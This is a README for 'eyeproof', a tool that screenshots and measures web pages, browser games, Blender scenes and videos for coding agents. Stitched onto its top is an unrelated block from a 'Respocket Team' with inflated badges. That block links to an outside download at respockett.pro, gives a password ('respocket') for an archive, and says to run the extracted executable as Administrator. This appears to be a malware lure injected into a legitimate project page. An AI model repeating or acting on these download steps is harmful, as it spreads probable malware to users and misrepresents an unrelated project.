<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# eyeproof

**Eyes for coding agents, headless.** An agent that built a web page, a browser game, a Blender scene or a video
cannot see it, and most of that work never appears on a screen: games run in headless Chromium, Blender renders in
the background, videos come out of ffmpeg. eyeproof makes the pictures itself, **measures** what can be measured,
and hands them to the agent (or to a vision model) to look at.

```text
$ eyeproof play "game/index.html?bug=freeze" until:g.ready wait:1500 key:ArrowRight:700 \
    "expect:g.player.x > 120" burst:idle:4:300
gfx: WebGL ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero) …)) | WebGPU google swiftshader  (--gpu soft)
measured: 2 finding(s)
  expect failed: g.player.x > 120 (after key:ArrowRight:700)
  burst idle: all 4 frames identical over 900 ms: the scene is not animating (paused, crashed render loop or static)
```

The idea: a screenshot alone leaves the model guessing. A screenshot **plus measured facts** (the render loop
is frozen, this texture file is missing, the dialog's bottom edge is 63 px below the viewport) lets it judge
reliably. In our small benchmark the measurements raised every model's hit rate (see below).

## What it does

| command | for | measured without any model |
|---|---|---|
| `eyeproof shot URL\|page.html` | web pages, UIs | horizontal scroll, elements off-screen, fixed elements cut off, text overflow, broken images, contrast < 3:1, overlapping text, `undefined`/`NaN`/lorem ipsum, console errors, failed requests |
| `eyeproof play URL STEPS…` | browser games: canvas, WebGL, WebGPU | blank/black/magenta canvas, blurry (low-res) canvas, nothing changed after an input, `expect:` state assertions, frozen render loop, jumps, fps |
| `eyeproof play … --record` | a game run as video | everything from the video row |
| `eyeproof blend scene.blend --frames …` | Blender, headless | missing image files, meshes without material, unconnected material output, no light, no camera, camera inside an object; per frame what is in view, its share and which edge cuts it; pixel checks of the renders |
| `eyeproof frames DIR\|GLOB` | render output, image sequences | black/blank/blown-out/magenta frames, frozen stretches, jumps; sheet that keeps every bad frame |
| `eyeproof shot clip.mp4` | videos | format, black stretches, frozen picture, cuts/flashes/glitches against the local motion (a camera pan is not a spike), audio missing/silent/clipping, audio vs picture length |
| `eyeproof diff A B` | before/after | side by side, changed pixels marked, share and bounding box |
| `eyeproof review … / look …` | second opinion | sends pictures + measured facts to a vision model on OpenRouter (default `elorian/glimpse`) |
| `eyeproof screen` | the real screen | only when you ask an agent to look at your screen |
| `eyeproof doctor` | setup | ffmpeg, Chromium soft/hw with the WebGL and WebGPU renderer it gets, Blender, key |

**Browser options:** `--gpu soft` (default: SwiftShader on the CPU, WebGL + WebGPU, never touches the GPU) or
`--gpu hw` (the real GPU via Vulkan, WebGL + WebGPU). Other options: `--viewport desktop|laptop|hd|tablet|mobile|WxH`,
`--full`, `--dark`, `--click SEL`, `--wait MS`, `--root DIR`.

## Install

Linux first (tested on Ubuntu with an NVIDIA GPU). Pages and games should work wherever Playwright's Chromium
runs. Blender is found as `blender` on PATH, as the `org.blender.Blender` flatpak or via `$EYEPROOF_BLENDER`.
Needs Python 3.10+ and ffmpeg.

```bash
git clone <this repo> eyeproof && cd eyeproof
uv venv .venv && uv pip install --python .venv/bin/python -e .      # or: python -m venv .venv && .venv/bin/pip install -e .
.venv/bin/python -m playwright install chromium
ln -sf "$PWD/.venv/bin/eyeproof" ~/.local/bin/eyeproof
eyeproof doctor
```

A vision-model review (`review`, `look`, `--model`) needs `OPENROUTER_API_KEY`. Everything else runs offline.

### Agent skill

`skills/eyeproof/SKILL.md` teaches an agent when and how to use eyeproof. `skills/install.sh` links it into Claude
Code (`~/.claude/skills/eyeproof`) and copies a variant into Hermes Agent, if those are installed. Machine-specific
rules (when the GPU is off limits, how to get keys, project shortcuts) go into `~/.config/eyeproof/LOCAL.md`. The
skill reads that file first and it never lives in the repo.

## Benchmark: who should look?

`bench/` gives every contestant the same pictures and prompt and scores which planted defects it reports.

- **Set 1:** 8 web pages (6 with 2–3 defects each, 2 clean) and a 6 s animation with two glitches, 17 defects.
- **Set 2:** 6 Blender renders (1 clean, 5 with one 3D defect each: floating table, character inside the table,
  head cut off, upside-down tree, missing texture).
- **raw** = pixels only; **tool** = plus eyeproof's measurements. Two runs each.

| | pages + video, raw | pages + video, tool | 3D, raw | 3D, tool |
|---|---|---|---|---|
| Claude Opus (Claude Code, reads the PNGs) | 88 % | **100 %** | 100 % | **100 %** |
| Claude Sonnet | 88 % | **100 %** | 100 % | 100 % |
| Glimpse (`elorian/glimpse`, OpenRouter) | 71 % | 88 % | 60 % | 100 % |

**Read this with care.** The benchmark is small, and the defects were planted by the same author who wrote the
checks, so the "tool" numbers are partly by construction. What it does show:
- the measurements help every model;
- an agent that can read images is the better eye;
- a raw video or a pixels-only review is where models miss things or invent them.

## Development

```bash
uv pip install --python .venv/bin/python pytest && .venv/bin/python -m pytest -q tests
```
The tests drive headless Chromium against `bench/fixtures/` (including a tiny WebGL game with `?bug=freeze|blank|deaf`).
The Blender test is skipped without Blender.

## License

MIT


---

MIT License

Copyright (c) 2026 legifx

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
